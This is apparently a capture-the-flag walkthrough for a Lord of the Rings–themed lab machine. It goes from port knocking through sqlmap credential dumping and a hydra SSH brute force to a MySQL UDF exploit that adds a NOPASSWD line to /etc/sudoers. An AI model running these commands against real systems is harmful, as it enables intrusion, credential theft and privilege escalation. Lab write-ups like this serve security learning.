@@ -1,0 +1,163 @@
+1- Nmap scan
+# nmap -sT -p- -A 192.168.0.101
+ssh port is open with a message:
+Easy as 1,2,3
+2- So i tried port knocking
+# nmap -Pn --host_timeout 201 --max-retries 0  -p 1 192.168.0.101
+# nmap -Pn --host_timeout 201 --max-retries 0  -p 2 192.168.0.101
+# nmap -Pn --host_timeout 201 --max-retries 0  -p 3 192.168.0.101
+
+3- nmap scan again nmap -sT -p- -A 192.168.0.101
+1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+4- so i accessed 1337 via browser http://192.168.0.101:1337
+then tried to access 192.168.0.101:1337/mordor
+dead end .. then i checked the source code
+<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
+i tried to 64 decode
+Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
+then tried to 64 decode Lzk3ODM0NTIxMC9pbmRleC5waHA=
+/978345210/index.php
+Welcome to the Gates of Mordor
+5-
+tried to access with admin admin and intercept the post request by burp suite
+then
+#sqlmap -r burp-post.txt --dbs
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] Webapp
+
+# sqlmap -o -r burp-post.txt -D Webapp --tables
+Database: Webapp
+[1 table]
++-------+
+| Users |
++-------+
+
+#sqlmap -o -r burp-post.txt -D Webapp -T Users --columns
+
+Database: Webapp
+Table: Users
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| id       | int(10)      |
+| password | varchar(255) |
+| username | varchar(255) |
++----------+--------------+
+
+# sqlmap -o -r burp-post.txt -D Webapp -T Users -C id,username,password --dump
+OR # sqlmap -o -r burp-post.txt -D Webapp -T Users --dump
+
+Database: Webapp
+Table: Users
+[5 entries]
++----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+
+# sqlmap -o -r burp-post.txt -D mysql --tables
+Database: mysql
+[24 tables]
++---------------------------+
+| user                      |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+
+# sqlmap -o -r burp-post.txt -D mysql -T user -C User,Password --dump
+
+Database: mysql
+Table: user
+[5 entries]
++------------------+-------------------------------------------+
+| User             | Password                                  |
++------------------+-------------------------------------------+
+| debian-sys-maint | *A55A9B9049F69BC2768C9284615361DFBD580B34 |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |
++------------------+-------------------------------------------+
+
+cracking root password gave me darkshadow
+--------------------------------------------------------------
+i tried to access and i succeeded via SSH with  smeagol MyPreciousR00t
+or you can make a list
+frodo
+iwilltakethering
+smeagol
+MyPreciousR00t
+aragorn
+AndMySword
+legolas
+AndMyBow
+gimli
+AndMyAxe
+
+then attach it by suing hydra
+# hydra 192.168.0.101 -L list -P list ssh -s 22
+[22][ssh] host: 192.168.0.101   login: smeagol   password: MyPreciousR00t
+
+--------------------------- priv escalation -----------------------------
+
+mysql is runing as root so i tried MySQL 4.x/5.0 - User-Defined Function Local Privilege Escalation Exploit
+it is exploit that gets mysql to run system commands
+cat /usr/share/exploitdb/platforms/linux/local/1518.c
+copied it into VM
+
+# gcc -g -c raptor_udf2.c
+# gcc -g -shared -Wl,-soname,raptor_udf2.so -oraptor_udf2.so raptor_udf2.o -lc
+# mysql -u root -p   (password : darkshadow )
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
+
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+mysql> select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers');
+mysql> exit
+# sudo bash
+# whoami
+root
+# cat Flag.txt
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf
